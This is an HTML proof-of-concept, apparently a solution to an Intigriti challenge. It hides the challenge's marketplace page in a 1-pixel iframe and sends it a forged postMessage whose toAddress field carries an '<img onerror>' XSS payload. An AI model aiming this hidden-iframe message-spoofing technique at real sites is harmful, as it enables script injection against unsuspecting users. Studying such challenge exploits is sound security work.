<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>postMessage DOM XSS PoC</title>
</head>
<body>

<h2>Loadingâ€¦</h2>

<iframe
  id="victim"
  src="https://challenge-0126.intigriti.io/marketplace.html?currency=1337COIN&price=1"
  style="width:1px;height:1px;border:0;"
></iframe>

<script>
const iframe = document.getElementById("victim");

iframe.onload = () => {
  // crafted message the victim trusts
  iframe.contentWindow.postMessage(
    {
      type: "submitTransaction",
      transaction: {
        toAddress: "<img src=x onerror=alert(1)>",
        currency: "1337COIN",
        amount: 1
      }
    },
    "*"
  );
};
</script>

</body>
</html>
